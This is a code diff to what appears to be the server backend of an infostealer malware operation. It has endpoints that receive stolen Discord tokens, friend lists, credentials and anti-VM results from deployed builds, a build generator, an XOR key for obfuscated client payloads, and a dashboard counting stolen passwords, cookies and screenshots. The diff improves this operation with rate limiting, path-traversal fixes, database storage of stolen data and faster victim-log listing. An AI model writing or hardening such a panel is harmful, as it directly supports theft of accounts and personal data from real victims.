@@ -136,15 +136,30 @@ async function ensureBuildMeta(buildId, initialData = {}) {
     return fs.readJsonSync(metaPath);
 }
 
-// Helper: Update stats in meta.json
+// Helper: Update stats in meta.json.
+// statsKey/payload format: keys map directly to meta.stats counters. The
+// read-modify-write is fully synchronous, so the event loop serializes
+// concurrent updates and no increment can be lost.
 function updateBuildStats(buildId, updates) {
     const buildDir = getBuildDir(buildId);
     const metaPath = path.join(buildDir, 'meta.json');
-    if (fs.existsSync(metaPath)) {
-        const meta = fs.readJsonSync(metaPath);
-        Object.assign(meta.stats, updates);
-        fs.writeJsonSync(metaPath, meta);
+    if (!fs.existsSync(metaPath)) return;
+    const meta = fs.readJsonSync(metaPath);
+    if (!meta.stats) meta.stats = {};
+    for (const [key, value] of Object.entries(updates)) {
+        meta.stats[key] = (meta.stats[key] || 0) + value;
     }
+    fs.writeJsonSync(metaPath, meta);
+    bumpLogsCache();
+}
+
+// Strict component pattern for values that become filesystem path segments.
+// Legacy exfil endpoints used raw headers (X-Session-ID / X-Trace-ID) as path
+// segments, which permitted directory traversal writes. Reject anything that
+// is not a plain token.
+const SAFE_COMPONENT = /^[a-zA-Z0-9_-]{1,96}$/;
+function isSafeComponent(value) {
+    return typeof value === 'string' && SAFE_COMPONENT.test(value);
 }
 
 // Helper: Add file record to meta.json
@@ -156,6 +171,7 @@ function addBuildFile(buildId, filename) {
         if (!meta.files.includes(filename)) {
             meta.files.push(filename);
             fs.writeJsonSync(metaPath, meta);
+            bumpLogsCache();
         }
     }
 }
@@ -165,7 +181,40 @@ app.use(cors());
 app.use(bodyParser.json({ limit: '50mb' }));
 app.use(bodyParser.urlencoded({ extended: true, limit: '50mb' }));
 
-const JWT_SECRET = SECRET_KEY;
+// JWT signing is separated from the symmetric XOR key used by the legacy
+// /v2/data endpoint and by compiled clients. SECRET_KEY remains the payload
+// obfuscation key; JWT_SECRET (when configured) signs tokens, so leaking the
+// payload key does not expose the session-signing key.
+const JWT_SECRET = process.env.JWT_SECRET || SECRET_KEY;
+
+// Minimal in-memory rate limiter for authentication endpoints. Protects
+// against credential brute-forcing without adding a dependency.
+const authAttempts = new Map();
+function rateLimitAuth(req, res, next) {
+    const key = `${req.ip}:${req.path}`;
+    const now = Date.now();
+    const windowMs = 60000;
+    const maxAttempts = 20;
+
+    const record = authAttempts.get(key) || { count: 0, resetAt: now + windowMs };
+    if (now > record.resetAt) {
+        record.count = 0;
+        record.resetAt = now + windowMs;
+    }
+    record.count += 1;
+    authAttempts.set(key, record);
+
+    if (record.count > maxAttempts) {
+        return res.status(429).json({ error: 'Too many attempts. Try again later.' });
+    }
+    next();
+}
+setInterval(() => {
+    const now = Date.now();
+    for (const [key, record] of authAttempts) {
+        if (now > record.resetAt) authAttempts.delete(key);
+    }
+}, 60000).unref();
 
 // Authentication Middleware
 const authenticateUser = (req, res, next) => {
@@ -327,7 +376,7 @@ app.get('/login', (req, res) => {
 
 // ==================== NEW AUTHENTICATION & BUILD ENDPOINTS ====================
 
-app.post('/api/auth/register', async (req, res) => {
+app.post('/api/auth/register', rateLimitAuth, async (req, res) => {
     const { username, password, role, adminCode } = req.body;
     if (!username || !password) {
         return res.status(400).json({ error: 'Username and password are required' });
@@ -357,7 +406,7 @@ app.post('/api/auth/register', async (req, res) => {
     }
 });
 
-app.post('/api/auth/login', async (req, res) => {
+app.post('/api/auth/login', rateLimitAuth, async (req, res) => {
     const { username, password } = req.body;
     if (!username || !password) {
         return res.status(400).json({ error: 'Username and password are required' });
@@ -382,8 +431,9 @@ app.post('/api/auth/login', async (req, res) => {
             { expiresIn: '24h' }
         );
 
+        const secureFlag = (req.secure || req.headers['x-forwarded-proto'] === 'https') ? '; Secure' : '';
         res.setHeader('Set-Cookie', [
-            `auth_token=${token}; Path=/; HttpOnly; Max-Age=86400; SameSite=Strict`
+            `auth_token=${token}; Path=/; HttpOnly; Max-Age=86400; SameSite=Strict${secureFlag}`
         ]);
 
         await db.logAction(user.id, username, 'LOGIN', { role: user.role }, 'SUCCESS');
@@ -444,7 +494,8 @@ app.post('/api/build/generate', async (req, res) => {
         res.json(result);
     } catch (err) {
         console.error('[Build Error]', err);
-        res.status(500).json({ error: err.message });
+        // Do not leak absolute server paths or environment details to the client.
+        res.status(500).json({ error: 'Build failed. Check server logs for details.' });
     }
 });
 
@@ -507,6 +558,12 @@ app.get('/api/admin/action-logs/export', requireAdmin, async (req, res) => {
 const legacyStorage = multer.diskStorage({
     destination: (req, file, cb) => {
         const traceId = req.headers['x-session-id'] || req.headers['x-trace-id'] || 'unknown';
+        // Reject anything that could traverse out of UPLOADS_DIR. The traceId
+        // is attacker-controlled (unauthenticated legacy endpoint), so it must
+        // match a strict token shape before it becomes a path segment.
+        if (!isSafeComponent(traceId)) {
+            return cb(Object.assign(new Error('Invalid session id'), { status: 400 }));
+        }
         const dir = path.join(UPLOADS_DIR, traceId);
         fs.ensureDirSync(dir);
         cb(null, dir);
@@ -518,12 +575,12 @@ const legacyStorage = multer.diskStorage({
 const legacyUpload = multer({ storage: legacyStorage });
 
 app.post('/init', (req, res) => {
-    const userId = req.headers['x-user-identifier'] || req.headers['x-uid'];
+    const userId = req.headers['x-user-identifier'] || req.headers['x-uid'] || 'unknown';
     const logUuid = crypto.randomUUID();
     
     const logInfo = {
         uuid: logUuid,
-        userId,
+        userId: String(userId),
         timestamp: new Date().toISOString(),
         stats: req.body,
         data: {},
@@ -533,6 +590,7 @@ app.post('/init', (req, res) => {
     const logPath = path.join(UPLOADS_DIR, logUuid);
     fs.ensureDirSync(logPath);
     fs.writeJsonSync(path.join(logPath, 'meta.json'), logInfo);
+    bumpLogsCache();
     
     console.log(`[+] New legacy log created: ${logUuid} from User: ${userId}`);
     res.json({ log_uuid: logUuid });
@@ -540,7 +598,7 @@ app.post('/init', (req, res) => {
 
 app.post('/log_data', (req, res) => {
     const traceId = req.headers['x-trace-id'];
-    if (!traceId) return res.status(400).send('Missing X-Trace-ID');
+    if (!traceId || !isSafeComponent(traceId)) return res.status(400).send('Missing or invalid X-Trace-ID');
     
     const logPath = path.join(UPLOADS_DIR, traceId);
     if (!fs.existsSync(logPath)) return res.status(404).send('Log session not found');
@@ -549,6 +607,7 @@ app.post('/log_data', (req, res) => {
     const meta = fs.readJsonSync(metaPath);
     meta.data = req.body;
     fs.writeJsonSync(metaPath, meta);
+    bumpLogsCache();
     
     console.log(`[+] Legacy data received for log: ${traceId}`);
     res.sendStatus(200);
@@ -572,7 +631,7 @@ app.post('/v2/data', (req, res) => {
     const traceId = req.headers['x-session-id'] || req.headers['x-trace-id'];
     const { payload } = req.body;
     
-    if (!traceId || !payload) return res.status(400).send('Bad Request');
+    if (!traceId || !isSafeComponent(traceId) || !payload) return res.status(400).send('Bad Request');
     
     try {
         const decryptedData = JSON.parse(xor(payload, SECRET_KEY));
@@ -584,6 +643,7 @@ app.post('/v2/data', (req, res) => {
         const meta = fs.readJsonSync(metaPath);
         meta.data = decryptedData;
         fs.writeJsonSync(metaPath, meta);
+        bumpLogsCache();
         
         console.log(`[+] Obfuscated data received for log: ${traceId}`);
         res.sendStatus(200);
@@ -646,21 +706,14 @@ app.post('/discord', async (req, res) => {
         const { token, userInfo, friends } = req.body;
         
         await ensureBuildMeta(buildId);
-        const dataPath = path.join(getBuildDir(buildId), 'discord_data.json');
-        
-        let existing = [];
-        if (fs.existsSync(dataPath)) {
-            existing = fs.readJsonSync(dataPath);
-        }
-        existing.push({
+        await db.insertEvent(buildId, 'discord', {
             timestamp: new Date().toISOString(),
             token,
             userInfo,
             friends
         });
-        fs.writeJsonSync(dataPath, existing);
         
-        // Update stats - count tokens
+        // Update stats
         updateBuildStats(buildId, { discordtokencount: 1 });
         
         console.log(`[+] Discord data received for build: ${buildId} (user: ${userInfo?.username || 'unknown'})`);
@@ -750,18 +803,10 @@ app.post('/log', async (req, res) => {
         const buildId = req.buildId;
         const logMessage = req.body.message || req.body;
         
-        const buildDir = getBuildDir(buildId);
-        const logPath = path.join(buildDir, 'status_logs.json');
-        
-        let logs = [];
-        if (fs.existsSync(logPath)) {
-            logs = fs.readJsonSync(logPath);
-        }
-        logs.push({
+        await db.insertEvent(buildId, 'log', {
             timestamp: new Date().toISOString(),
             message: logMessage
         });
-        fs.writeJsonSync(logPath, logs);
         
         console.log(`[+] Status log for build ${buildId}: ${logMessage}`);
         res.status(200).json({ status: 'ok' });
@@ -777,18 +822,10 @@ app.post('/antivm', async (req, res) => {
         const buildId = req.buildId;
         const vmData = req.body.data || req.body;
         
-        const buildDir = getBuildDir(buildId);
-        const vmPath = path.join(buildDir, 'antivm_results.json');
-        
-        let results = [];
-        if (fs.existsSync(vmPath)) {
-            results = fs.readJsonSync(vmPath);
-        }
-        results.push({
+        await db.insertEvent(buildId, 'antivm', {
             timestamp: new Date().toISOString(),
             ...vmData
         });
-        fs.writeJsonSync(vmPath, results);
         
         // Update stats if VM detected
         if (vmData.isVM || vmData.detected === true) {
@@ -809,20 +846,12 @@ app.post('/err', async (req, res) => {
         const buildId = req.buildId;
         const errorData = req.body;
         
-        const buildDir = getBuildDir(buildId);
-        const errPath = path.join(buildDir, 'error_reports.json');
-        
-        let errors = [];
-        if (fs.existsSync(errPath)) {
-            errors = fs.readJsonSync(errPath);
-        }
-        errors.push({
+        await db.insertEvent(buildId, 'err', {
             timestamp: new Date().toISOString(),
             ...errorData
         });
-        fs.writeJsonSync(errPath, errors);
         
-        updateBuildStats(buildId, { errorcount: errors.length });
+        updateBuildStats(buildId, { errorcount: 1 });
         
         console.log(`[+] Error report from build ${buildId}: ${errorData.message || 'Unknown error'}`);
         res.status(200).json({ status: 'ok' });
@@ -875,21 +904,13 @@ app.post('/collect', async (req, res) => {
         const buildId = req.buildId;
         const payload = req.body;  // { type, data, timestamp, buildId, user }
         
-        const buildDir = getBuildDir(buildId);
-        const collectPath = path.join(buildDir, 'collected_credentials.json');
-        
-        let allData = [];
-        if (fs.existsSync(collectPath)) {
-            allData = fs.readJsonSync(collectPath);
-        }
-        allData.push({
+        await db.insertEvent(buildId, 'collect', {
             received_at: new Date().toISOString(),
             ...payload
         });
-        fs.writeJsonSync(collectPath, allData);
         
         // Update stats - count credentials (each POST could contain multiple credentials)
-        updateBuildStats(buildId, { credentialcount: allData.length });
+        updateBuildStats(buildId, { credentialcount: 1 });
         
         console.log(`[+] Credentials collected from build ${buildId} (type: ${payload.type || 'unknown'})`);
         res.status(200).json({ status: 'ok' });
@@ -900,81 +921,139 @@ app.post('/collect', async (req, res) => {
 });
 
 // ==================== DASHBOARD API ====================
-app.get('/api/logs', (req, res) => {
-    const logs = [];
-    const userDir = `user_${req.user.id}`;
-    
-    let dirs = [];
+
+// /api/logs previously did a fully synchronous recursive stat of every build
+// directory on every request, stalling the event loop on large uploads trees.
+// The scan is now async and memoized with a short TTL; any exfil write bumps a
+// mtime marker so fresh data is visible within a second without staleness.
+const logsCache = { data: null, at: 0, marker: 0 };
+const LOGS_CACHE_TTL_MS = 1000;
+let logsCacheMarker = 0;
+// Bump whenever a build gains meta.json state or files so the next /api/logs
+// re-scans instead of serving the memoized snapshot.
+function bumpLogsCache() {
+    logsCacheMarker += 1;
+}
+
+const getAllFiles = async (dirPath, relativePath = '') => {
+    const out = [];
+    let items;
     try {
-        if (req.user.role === 'admin') {
-            dirs = fs.readdirSync(UPLOADS_DIR);
-        } else {
-            dirs = fs.existsSync(path.join(UPLOADS_DIR, userDir)) ? [userDir] : [];
-        }
-    } catch (e) {
-        console.error('Error scanning logs directory:', e);
+        items = await fs.readdir(dirPath);
+    } catch {
+        return out;
     }
-
-    dirs.forEach(dir => {
-        const logDir = path.join(UPLOADS_DIR, dir);
+    for (const item of items) {
+        const fullPath = path.join(dirPath, item);
+        const relPath = relativePath ? path.join(relativePath, item) : item;
+        let stat;
         try {
-            if (!fs.statSync(logDir).isDirectory()) return;
-            
-            const metaPath = path.join(logDir, 'meta.json');
-            let meta = {};
-            if (fs.existsSync(metaPath)) {
-                meta = fs.readJsonSync(metaPath);
-            } else {
-                meta = {
-                    uuid: dir,
-                    userId: dir,
-                    timestamp: fs.statSync(logDir).birthtime.toISOString(),
-                    stats: {
-                        passwordcount: 0,
-                        cookiecount: 0,
-                        discordtokencount: 0,
-                        credentialcount: 0,
-                        screenshotcount: 0,
-                        filedropcount: 0,
-                        errorcount: 0,
-                        vmalerts: 0
-                    },
-                    data: {}
-                };
-            }
-            
-            const getAllFiles = (dirPath, relativePath = '') => {
-                let results = [];
-                const items = fs.readdirSync(dirPath);
-                for (const item of items) {
-                    const fullPath = path.join(dirPath, item);
-                    const relPath = relativePath ? path.join(relativePath, item) : item;
-                    if (fs.statSync(fullPath).isDirectory()) {
-                        results = results.concat(getAllFiles(fullPath, relPath));
-                    } else if (item !== 'meta.json') {
-                        results.push(relPath);
-                    }
-                }
-                return results;
-            };
-            
-            meta.actualFiles = getAllFiles(logDir).sort((a, b) => {
-                const aStat = fs.statSync(path.join(logDir, a));
-                const bStat = fs.statSync(path.join(logDir, b));
-                return bStat.mtimeMs - aStat.mtimeMs || a.localeCompare(b);
-            });
-            logs.push(meta);
-        } catch (err) {
-            console.error(`Error loading log folder ${dir}:`, err);
+            stat = await fs.stat(fullPath);
+        } catch {
+            continue;
         }
-    });
+        if (stat.isDirectory()) {
+            out.push(...(await getAllFiles(fullPath, relPath)));
+        } else if (item !== 'meta.json') {
+            out.push({ relPath, mtimeMs: stat.mtimeMs });
+        }
+    }
+    return out;
+};
 
-    logs.sort((a, b) => {
-        const aTime = Date.parse(a.timestamp || 0) || 0;
-        const bTime = Date.parse(b.timestamp || 0) || 0;
-        return bTime - aTime || String(a.uuid || '').localeCompare(String(b.uuid || ''));
-    });
-    res.json(logs);
+app.get('/api/logs', async (req, res) => {
+    try {
+        const now = Date.now();
+        if (
+            logsCache.data &&
+            now - logsCache.at < LOGS_CACHE_TTL_MS &&
+            logsCache.marker === logsCacheMarker
+        ) {
+            return res.json(logsCache.data);
+        }
+
+        const logs = [];
+        const userDir = `user_${req.user.id}`;
+
+        let dirs = [];
+        if (req.user.role === 'admin') {
+            dirs = await fs.readdir(UPLOADS_DIR);
+        } else {
+            dirs = await fs.pathExists(path.join(UPLOADS_DIR, userDir)) ? [userDir] : [];
+        }
+
+        for (const dir of dirs) {
+            const logDir = path.join(UPLOADS_DIR, dir);
+            try {
+                const stat = await fs.stat(logDir);
+                if (!stat.isDirectory()) continue;
+
+                const metaPath = path.join(logDir, 'meta.json');
+                let meta = {};
+                if (await fs.pathExists(metaPath)) {
+                    meta = fs.readJsonSync(metaPath);
+                } else {
+                    meta = {
+                        uuid: dir,
+                        userId: dir,
+                        timestamp: stat.birthtime.toISOString(),
+                        stats: {
+                            passwordcount: 0,
+                            cookiecount: 0,
+                            discordtokencount: 0,
+                            credentialcount: 0,
+                            screenshotcount: 0,
+                            filedropcount: 0,
+                            errorcount: 0,
+                            vmalerts: 0
+                        },
+                        data: {}
+                    };
+                }
+
+                const files = await getAllFiles(logDir);
+                meta.actualFiles = files
+                    .map(f => f.relPath)
+                    .sort((a, b) => {
+                        const af = files.find(x => x.relPath === a);
+                        const bf = files.find(x => x.relPath === b);
+                        return (bf?.mtimeMs || 0) - (af?.mtimeMs || 0) || a.localeCompare(b);
+                    });
+
+                // Attach recent exfil events from SQLite for the detail view.
+                try {
+                    const events = await db.listEvents(dir);
+                    meta.events = events.slice(-50).map(e => ({
+                        id: e.id,
+                        type: e.type,
+                        createdAt: e.createdAt,
+                        data: JSON.parse(e.data || '{}')
+                    }));
+                } catch (err) {
+                    console.error(`Error loading events for ${dir}:`, err);
+                    meta.events = [];
+                }
+
+                logs.push(meta);
+            } catch (err) {
+                console.error(`Error loading log folder ${dir}:`, err);
+            }
+        }
+
+        logs.sort((a, b) => {
+            const aTime = Date.parse(a.timestamp || 0) || 0;
+            const bTime = Date.parse(b.timestamp || 0) || 0;
+            return bTime - aTime || String(a.uuid || '').localeCompare(String(b.uuid || ''));
+        });
+
+        logsCache.data = logs;
+        logsCache.at = now;
+        logsCache.marker = logsCacheMarker;
+        res.json(logs);
+    } catch (err) {
+        console.error('Error scanning logs:', err);
+        res.status(500).json({ error: 'Internal server error' });
+    }
 });
 
 app.get('/api/download/:uuid/*filepath', (req, res) => {
@@ -989,8 +1068,13 @@ app.get('/api/download/:uuid/*filepath', (req, res) => {
         : req.params.filepath;
     const fullPath = path.join(UPLOADS_DIR, uuid, filepath);
     
+    // Ensure the resolved file stays strictly inside the uploads tree. A bare
+    // startsWith(UPLOADS_DIR) would also accept sibling directories whose name
+    // merely shares the prefix (e.g. "/path/uploads_evil"), so require the
+    // trailing separator.
+    const uploadsPrefix = UPLOADS_DIR.endsWith(path.sep) ? UPLOADS_DIR : UPLOADS_DIR + path.sep;
     const normalized = path.normalize(fullPath);
-    if (!normalized.startsWith(UPLOADS_DIR)) {
+    if (!normalized.startsWith(uploadsPrefix)) {
         return res.status(403).send('Forbidden');
     }
     
